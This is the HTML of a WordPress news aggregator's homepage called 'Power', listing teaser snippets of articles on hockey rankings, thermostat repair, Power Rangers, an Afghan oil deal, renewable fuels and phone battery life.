xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.78039215686275 1" /><feFuncG type="table" tableValues="0 0.94901960784314" /><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-purple-green"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.44705882352941 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.098039215686275 1" /><feFuncG type="table" tableValues="0 0.66274509803922" /><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><div id="page" class="site">
<a class="skip-link screen-reader-text" href="#content">
Skip to content</a>
    <div class="wrapper" id="custom-background-css">
        <header class="mg-headwidget">
            <!--==================== TOP BAR ====================-->

            <div class="mg-head-detail hidden-xs">
    <div class="container-fluid">
        <div class="row">
                        <div class="col-md-6 col-xs-12">
                <ul class="info-left">
                            <li>Fri. Jan 20th, 2023             <span  id="time" class="time"></span>
                    </li>
                    </ul>
            </div>
                        <div class="col-md-6 col-xs-12">
                <ul class="mg-social info-right">
                    
                                                                                                                                      
                                      </ul>
            </div>
                    </div>
    </div>
</div>
            <div class="clearfix"></div>
                        <div class="mg-nav-widget-area-back" style='background-image: url("wp-content/themes/newsup/images/head-back.jpg" );'>
                        <div class="overlay">
              <div class="inner"  style="background-color:rgba(32,47,91,0.4);" > 
                <div class="container-fluid">
                    <div class="mg-nav-widget-area">
                        <div class="row align-items-center">
                            <div class="col-md-3 col-sm-4 text-center-xs">
                                <div class="navbar-header">
                                                                <div class="site-branding-text">
                                <h1 class="site-title"> <a href="" rel="home">Power</a></h1>
                                <p class="site-description">utilize rich relationships</p>
                                </div>
                                                              </div>
                            </div>
                           
                        </div>
                    </div>
                </div>
              </div>
              </div>
          </div>
    <div class="mg-menu-full">
      <nav class="navbar navbar-expand-lg navbar-wp">
        <div class="container-fluid flex-row-reverse">
          <!-- Right nav -->
                    <div class="m-header d-flex pl-3 ml-auto my-2 my-lg-0 position-relative align-items-center">
                                                <a class="mobilehomebtn" href=""><span class="fas fa-home"></span></a>
                        <!-- navbar-toggle -->
                        <button class="navbar-toggler mx-auto" type="button" data-toggle="collapse" data-target="#navbar-wp" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                          <i class="fas fa-bars"></i>
                        </button>
                        <!-- /navbar-toggle -->
                                                <div class="dropdown show mg-search-box pr-2">
                            <a class="dropdown-toggle msearch ml-auto" href="#" role="button" id="dropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                               <i class="fas fa-search"></i>
                            </a>

                            <div class="dropdown-menu searchinner" aria-labelledby="dropdownMenuLink">
                        <form role="search" method="get" id="searchform" action="">
  <div class="input-group">
    <input type="search" class="form-control" placeholder="Search" value="" name="s" />
    <span class="input-group-btn btn-default">
    <button type="submit" class="btn"> <i class="fas fa-search"></i> </button>
    </span> </div>
</form>                      </div>
                        </div>
                                              
                    </div>
                    <!-- /Right nav -->
         
          
                  <div class="collapse navbar-collapse" id="navbar-wp">
                  	<div class="d-md-block">
                  <ul class="nav navbar-nav mr-auto"><li class="nav-item menu-item active"><a class="nav-link " href="" title="Home">Home</a></li><li class="nav-item menu-item page_item dropdown page-item-50"><a class="nav-link" href="cookies/index.html">Cookie policy</a></li><li class="nav-item menu-item page_item dropdown page-item-48"><a class="nav-link" href="privacy-policy/index.html">Privacy policy</a></li><li class="nav-item menu-item page_item dropdown page-item-49"><a class="nav-link" href="terms-of-use/index.html">Terms of use</a></li></ul>
        				</div>		
              		</div>
          </div>
      </nav> <!-- /Navigation -->
    </div>
</header>
<div class="clearfix"></div>
              <section class="mg-latest-news-sec">
                                <div class="container-fluid">
                    <div class="mg-latest-news">
                         <div class="bn_title">
                            <h2>
                                                                    Latest Post<span></span>
                                                            </h2>
                        </div>
                         
                        <div class="mg-latest-news-slider marquee">
                                                                                        <a href="post/46/index.html">
                                        <span>Power Rankings &#8211; IIHF</span>
                                     </a>
                                                                        <a href="post/44/index.html">
                                        <span>Hotwire Your Broken Thermostat in a Weather Emergency</span>
                                     </a>
                                                                        <a href="post/42/index.html">
                                        <span>Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary</span>
                                     </a>
                                                                        <a href="post/40/index.html">
                                        <span>Taliban and China firm agree Afghanistan oil extraction deal</span>
                                     </a>
                                                                        <a href="post/38/index.html">
                                        <span>What Counts as a &#8216;Renewable&#8217; Fuel?</span>
                                     </a>
                                                            </div>
                    </div>
            </div>
            </section>
            <!-- Excluive line END -->
                    <section class="mg-fea-area">
                    <div class="overlay">
                <div class="container-fluid">
                    <div class="row">
                                                <div class="col-md-8">
                            <div id="homemain"class="homemain owl-carousel mr-bot60 pd-r-10"> 
                                         <div class="item">
                <div class="mg-blog-post lg back-img" 
                                style="background-image: url('wp-content/uploads/NaN/NaN/thumb46.jpg');"
                >

                <a class="link-div" href="post/46/index.html"> </a>

                <article class="bottom">
                        <span class="post-form"><i class="fas fa-camera"></i></span>
                        <div class="mg-blog-category"> <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a> </div>
                        <h4 class="title"> <a href="post/46/index.html">Power Rankings &#8211; IIHF</a></h4>
                            <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/user/index.html"><i class="fas fa-user-circle"></i> 
        admin</a>
         
    </div>
                    </article>
            </div>
        </div>
             <div class="item">
                <div class="mg-blog-post lg back-img" 
                                style="background-image: url('wp-content/uploads/NaN/NaN/thumb44.jpg');"
                >

                <a class="link-div" href="post/44/index.html"> </a>

                <article class="bottom">
                        <span class="post-form"><i class="fas fa-camera"></i></span>
                        <div class="mg-blog-category"> <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a> </div>
                        <h4 class="title"> <a href="post/44/index.html">Hotwire Your Broken Thermostat in a Weather Emergency</a></h4>
                            <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JeffSomers/index.html"><i class="fas fa-user-circle"></i> 
        Jeff Somers</a>
         
    </div>
                    </article>
            </div>
        </div>
             <div class="item">
                <div class="mg-blog-post lg back-img" 
                                style="background-image: url('wp-content/uploads/NaN/NaN/thumb42.png');"
                >

                <a class="link-div" href="post/42/index.html"> </a>

                <article class="bottom">
                        <span class="post-form"><i class="fas fa-camera"></i></span>
                        <div class="mg-blog-category"> <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a> </div>
                        <h4 class="title"> <a href="post/42/index.html">Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary</a></h4>
                            <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JamesWhitbrook/index.html"><i class="fas fa-user-circle"></i> 
        James Whitbrook</a>
         
    </div>
                    </article>
            </div>
        </div>
             <div class="item">
                <div class="mg-blog-post lg back-img" 
                                style="background-image: url('wp-content/uploads/NaN/NaN/thumb40.jpg');"
                >

                <a class="link-div" href="post/40/index.html"> </a>

                <article class="bottom">
                        <span class="post-form"><i class="fas fa-camera"></i></span>
                        <div class="mg-blog-category"> <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a> </div>
                        <h4 class="title"> <a href="post/40/index.html">Taliban and China firm agree Afghanistan oil extraction deal</a></h4>
                            <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/https://www.facebook.com/bbcnews/index.html"><i class="fas fa-user-circle"></i> 
        https://www.facebook.com/bbcnews</a>
         
    </div>
                    </article>
            </div>
        </div>
             <div class="item">
                <div class="mg-blog-post lg back-img" 
                                style="background-image: url('wp-content/uploads/NaN/NaN/thumb38.jpg');"
                >

                <a class="link-div" href="post/38/index.html"> </a>

                <article class="bottom">
                        <span class="post-form"><i class="fas fa-camera"></i></span>
                        <div class="mg-blog-category"> <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a> </div>
                        <h4 class="title"> <a href="post/38/index.html">What Counts as a &#8216;Renewable&#8217; Fuel?</a></h4>
                            <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JohnMcCracken,Grist/index.html"><i class="fas fa-user-circle"></i> 
        John McCracken, Grist</a>
         
    </div>
                    </article>
            </div>
        </div>
                                </div>
                        </div> 
                                    <div class="col-md-4 top-right-area">
                    <div id="exTab2" >
                    <ul class="nav nav-tabs">
                        <li class="nav-item">
                            <a class="nav-link active" data-toggle="tab" href="#tan-main-banner-latest-trending-popular-recent"
                               aria-controls="Recent">
                               <i class="fas fa-clock"></i>Latest                            </a>
                        </li>

                        <li class="nav-item">
                            <a class="nav-link" data-toggle="tab" href="#tan-main-banner-latest-trending-popular-popular"
                               aria-controls="Popular">
                                <i class="fas fa-fire"></i> Popular                            </a>
                        </li>


                        <li class="nav-item">
                            <a class="nav-link" data-toggle="tab" href="#tan-main-banner-latest-trending-popular-categorised"
                               aria-controls="Categorised">
                                <i class="fas fa-bolt"></i> Trending                            </a>
                        </li>

                    </ul>
                <div class="tab-content">
                    <div id="tan-main-banner-latest-trending-popular-recent" role="tabpanel" class="tab-pane active">
                        <div class="mg-posts-sec mg-posts-modul-2"><div class="mg-posts-sec-inner row"><div class="small-list-post col-lg-12"><ul>                
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/46/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb46.jpg" alt="Power Rankings &#8211; IIHF">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/46/index.html">
                                        <h5>
                                        Power Rankings &#8211; IIHF                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/44/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb44.jpg" alt="Hotwire Your Broken Thermostat in a Weather Emergency">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/44/index.html">
                                        <h5>
                                        Hotwire Your Broken Thermostat in a Weather Emergency                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/42/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb42.png" alt="Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/42/index.html">
                                        <h5>
                                        Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/40/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb40.jpg" alt="Taliban and China firm agree Afghanistan oil extraction deal">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/40/index.html">
                                        <h5>
                                        Taliban and China firm agree Afghanistan oil extraction deal                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
            </ul></div></div></div>                    </div>


                    <div id="tan-main-banner-latest-trending-popular-popular" role="tabpanel" class="tab-pane">
                        <div class="mg-posts-sec mg-posts-modul-2"><div class="mg-posts-sec-inner row"><div class="small-list-post col-lg-12"><ul>                
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/10/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb10.jpg" alt="The Battery That Never Gets Flat the perfect gift">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/10/index.html">
                                        <h5>
                                        The Battery That Never Gets Flat the perfect gift                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/12/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb12.jpg" alt="How to Save Your Smartphone&#8217;s Battery Life (2023): Tips for iPhone and Android">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/12/index.html">
                                        <h5>
                                        How to Save Your Smartphone&#8217;s Battery Life (2023): Tips for iPhone and Android                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/14/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb14.jpg" alt="This App Uses AI to Generate Custom Playlists">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/14/index.html">
                                        <h5>
                                        This App Uses AI to Generate Custom Playlists                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/16/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb16.jpg" alt="What Counts as a &#8216;Renewable&#8217; Fuel?">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/16/index.html">
                                        <h5>
                                        What Counts as a &#8216;Renewable&#8217; Fuel?                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
            </ul></div></div></div>                    </div>

                                            <div id="tan-main-banner-latest-trending-popular-categorised" role="tabpanel" class="tab-pane ">
                            <div class="mg-posts-sec mg-posts-modul-2"><div class="mg-posts-sec-inner row"><div class="small-list-post col-lg-12"><ul>                
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/46/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb46.jpg" alt="Power Rankings &#8211; IIHF">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/46/index.html">
                                        <h5>
                                        Power Rankings &#8211; IIHF                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/44/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb44.jpg" alt="Hotwire Your Broken Thermostat in a Weather Emergency">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/44/index.html">
                                        <h5>
                                        Hotwire Your Broken Thermostat in a Weather Emergency                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/42/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb42.png" alt="Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/42/index.html">
                                        <h5>
                                        Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
                            
                  <li class="small-post clearfix">
                                                                           <div class="img-small-post">
                                <a href="post/40/index.html">
                                                                    <img src="wp-content/uploads/NaN/NaN/thumb40.jpg" alt="Taliban and China firm agree Afghanistan oil extraction deal">
                                                                </a>
                            </div>
                                                <div class="small-post-content">
                                <div class="mg-blog-category">
                                   <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                </div>
                                 <div class="title_small_post">
                                    
                                    <a href="post/40/index.html">
                                        <h5>
                                        Taliban and China firm agree Afghanistan oil extraction deal                                        </h5>
                                    </a>
                                   
                                </div>
                        </div>
                </li>
            </ul></div></div></div>                        </div>
                    
                </div>
            </div>
        </div> 
                                                </div>
                </div>
            </div>
        </section>
        <!--==/ Home Slider ==-->
                <!-- end slider-section -->
        <!--==================== Newsup breadcrumb section ====================-->
            <div id="content" class="container-fluid home">
                <!--row-->
                <div class="row">
                    <!--col-md-8-->
                                        <div class="col-md-8">
                        <div id="post-46" class="post-46 post type-post status-publish format-standard has-post-thumbnail hentry category-power">
                            <!-- mg-posts-sec mg-posts-modul-6 -->
                            <div class="mg-posts-sec mg-posts-modul-6">
                                <!-- mg-posts-sec-inner -->
                                <div class="mg-posts-sec-inner">
                                                                        <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb46.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/46/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/46/index.html">Power Rankings &#8211; IIHF</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/user/index.html"><i class="fas fa-user-circle"></i> 
        admin</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>Power Rankings  IIHF Team Canada vs. Czechia IIHF 2023 World Junior Championship  TSN 2023 World Junior Hockey Championship schedule: December 26, 2022  Habs Eyes on the Prize World Juniors schedule 2023: Full dates,&hellip;</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb44.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/44/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/44/index.html">Hotwire Your Broken Thermostat in a Weather Emergency</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JeffSomers/index.html"><i class="fas fa-user-circle"></i> 
        Jeff Somers</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>Something that’s often neglected, even by proactive folks who actually check on the heat before the first frost, is the humble thermostat. That tiny appliance on your wall—whether it’s an&hellip;</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb42.png');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/42/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/42/index.html">Amy Jo Johnson Reveals Why She Isn&#8217;t Returning for Power Rangers&#8217; 30th Anniversary</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JamesWhitbrook/index.html"><i class="fas fa-user-circle"></i> 
        James Whitbrook</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>This week we got our first look at Power Rangers’ big celebration for its 30th birthday—a new special episode reuniting a mix of first and second-generation rangers from the original&hellip;</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb40.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/40/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/40/index.html">Taliban and China firm agree Afghanistan oil extraction deal</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/https://www.facebook.com/bbcnews/index.html"><i class="fas fa-user-circle"></i> 
        https://www.facebook.com/bbcnews</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>It is the first major energy extraction agreement with a foreign firm since the Taliban took power.</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb38.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/38/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/38/index.html">What Counts as a &#8216;Renewable&#8217; Fuel?</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/JohnMcCracken,Grist/index.html"><i class="fas fa-user-circle"></i> 
        John McCracken, Grist</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>The EPA wants more ethanol, biogas, and wood pellet power in the nation's fuel mix. But is that actually a good thing?</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb36.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/36/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/36/index.html">This App Uses AI to Generate Custom Playlists</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/PranayParab/index.html"><i class="fas fa-user-circle"></i> 
        Pranay Parab</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>If you’re tired of music streaming apps deciding what you should listen to, you can take back the power. PlaylistAI is an app that uses AI to help you create&hellip;</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb34.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/34/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/34/index.html">How to Save Your Smartphone&#8217;s Battery Life (2023): Tips for iPhone and Android</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/SimonHill/index.html"><i class="fas fa-user-circle"></i> 
        Simon Hill</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>Shrug off your anxiety with these power-saving tips to extend the juice of your iPhone or Android phone.</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb32.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
        <a class="link-div" href="post/32/index.html"></a>
    </div> 
</div>
                                            <div class="mg-sec-top-post py-3 col">
                                                    <div class="mg-blog-category"> 
                                                        <a class="newsup-categories category-color-1" href="post/category/power/index.html" alt="View all posts in Power"> 
                                 Power
                             </a>                                                    </div>

                                                    <h4 class="entry-title title"><a href="post/32/index.html">The Battery That Never Gets Flat</a></h4>
                                                        <div class="mg-blog-meta">
        <span class="mg-blog-date"><i class="fas fa-clock"></i>
         <a href="post/date/2023/01/index.html">
         </a></span>
         <a class="auth" href="post/author/FionaDunlevy/index.html"><i class="fas fa-user-circle"></i> 
        Fiona Dunlevy</a>
         
    </div>
    
                                                
                                                    <div class="mg-content">
                                                        <p>Your body generates enough energy to power wearables, medical sensors, and implanted devices—and tech designers are plugging in.</p>
                                                </div>
                                            </div>
                                    </article>
                                                                         <article class="d-md-flex mg-posts-sec-post align-items-center">
                                    <div class="col-12 col-md-6">
    <div class="mg-post-thumb back-img md" style="background-image: url('wp-content/uploads/NaN/NaN/thumb30.jpg');">
        <span class="post-form"><i class="fas fa-camera"></i></span>
